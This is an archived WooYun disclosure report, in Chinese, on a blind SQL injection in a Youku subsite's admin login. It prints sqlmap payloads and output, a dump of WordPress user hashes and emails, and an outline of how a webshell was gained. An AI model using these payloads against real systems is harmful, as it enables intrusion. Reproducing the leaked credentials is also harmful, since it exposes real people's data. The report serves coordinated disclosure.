@@ -1,0 +1,248 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		优酷网root权限盲注漏洞导致数十个分站与数据库沦陷  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		优酷网root权限盲注漏洞导致数十个分站与数据库沦陷  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/数据流">数据流</a> 
+</li><li>提交时间：		2013-07-31 11:35</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-07-31：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-07-31：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-08-10：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-08-20：	细节向普通白帽子公开<br/>
+									2013-08-30：	细节向实习白帽子公开<br/>
+									2013-09-14：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">自上个月连续提交3个20rank的sohu都没提交了 最近又看到一群人在刷struts2我都不忍心看wooyun被刷屏....无奈</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1,通过google找到分站http://minisite.youku.com/<br />
+<br />
+随手试了试admin manage login 等找到admin1 的后台登陆地址<br />
+<br />
+<br />
+<br />
+2,http://minisite.youku.com/admin1/login.php<br />
+<br />
+</p><p class="detail"><a href="../images/31111921f579e5c26995a474ba5e6c77350f17e0.png" target="_blank"><img src="../images/31111921f579e5c26995a474ba5e6c77350f17e0.png" alt="y1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+登陆框中username参数加单引号&#039; 出现异常<br />
+<br />
+</p><p class="detail"><a href="../images/311121084336e704e794df3f9a6b55cd4b567592.png" target="_blank"><img src="../images/311121084336e704e794df3f9a6b55cd4b567592.png" alt="y2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+而输入两个单引号就正常了&#039;&#039;<br />
+<br />
+</p><p class="detail"><a href="../images/311122103a76596c03b5957de57146c0a45be403.png" target="_blank"><img src="../images/311122103a76596c03b5957de57146c0a45be403.png" alt="y3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+出现这样的情况就怀疑有注射了<br />
+<br />
+开sqlmap跑了下 果然存在注射 <br />
+<br />
+<br />
+<br />
+</p><pre><code>Place: POST<br />
+Parameter: username<br />
+    Type: boolean-based blind<br />
+    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)<br />
+    Payload: username=asd&#039; RLIKE IF(5146=5146,0x617364,0x28) AND &#039;OwBw&#039;=&#039;OwBw<br />
+<br />
+    Type: stacked queries<br />
+    Title: MySQL &gt; 5.0.11 stacked queries<br />
+    Payload: username=asd&#039;; SELECT SLEEP(5)-- <br />
+---<br />
+web application technology: Apache<br />
+back-end DBMS: MySQL 5.0.11<br />
+current user:    &#039;root@%&#039;<br />
+sqlmap identified the following</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+root权限  里面有77个库<br />
+<br />
+<br />
+<br />
+3, 找到一个wordpress<br />
+<br />
+http://minisite.youku.com/blog/<br />
+<br />
+<br />
+<br />
+通过以上注射点 注射blog库 <br />
+<br />
+</p><pre><code>user_pass,user_login,user_email,user_activation_key<br />
+$P$B0mSwAo6Md/Xc72veM7xPbz1CGNdjx1,Editor,Editor@youku.com,&lt;blank&gt;<br />
+$P$B3/owR5KcpAZ4TSBKB.z/CY.ZbQi2u0,qiqima,qiqima@youku.com,&lt;blank&gt;<br />
+$P$B7LWNj2CAEk1xUuR7bKvQnbdXzwaZC/,admin,zhangpo@youku.com,zwjIDkDyJxAPw0gFMYlY<br />
+$P$Bg.5Y/4sI7wSvYFIjJUGWFWg8TXRMf0,luluma,luluma@youku.com,&lt;blank&gt;<br />
+12061103,youku,youku@youku.com,&lt;blank&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+其中Editor为弱密码</p><p class="detail"><a href="../images/31112703c599ee25a374a12c81df0b01530ae5c9.png" target="_blank"><img src="../images/31112703c599ee25a374a12c81df0b01530ae5c9.png" alt="y4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+成功登陆后台<br />
+<br />
+</p><p class="detail"><a href="../images/311128146bccbaf44ee2df3f2d16e7492d6bb193.png" target="_blank"><img src="../images/311128146bccbaf44ee2df3f2d16e7492d6bb193.png" alt="y6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4,服务器存在apache解析漏洞 <br />
+<br />
+通过上传图片获取webshell<br />
+<br />
+</p><p class="detail"><a href="../images/31113000c29dcdba30265e51b6b66a5df5871c91.png" target="_blank"><img src="../images/31113000c29dcdba30265e51b6b66a5df5871c91.png" alt="y7.png" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">由于权限配置问题在于导致服务器上几十个站点沦陷<br />
+<br />
+</p><p class="detail"><a href="../images/31113125398486b16d1be0bf13ad3e89125c5983.png" target="_blank"><img src="../images/31113125398486b16d1be0bf13ad3e89125c5983.png" alt="y8.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/数据流" title="数据流">数据流</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-032916" title="优酷网root权限盲注漏洞导致数十个分站与数据库沦陷">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-07-31 11:44</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">修复中</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="32916";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
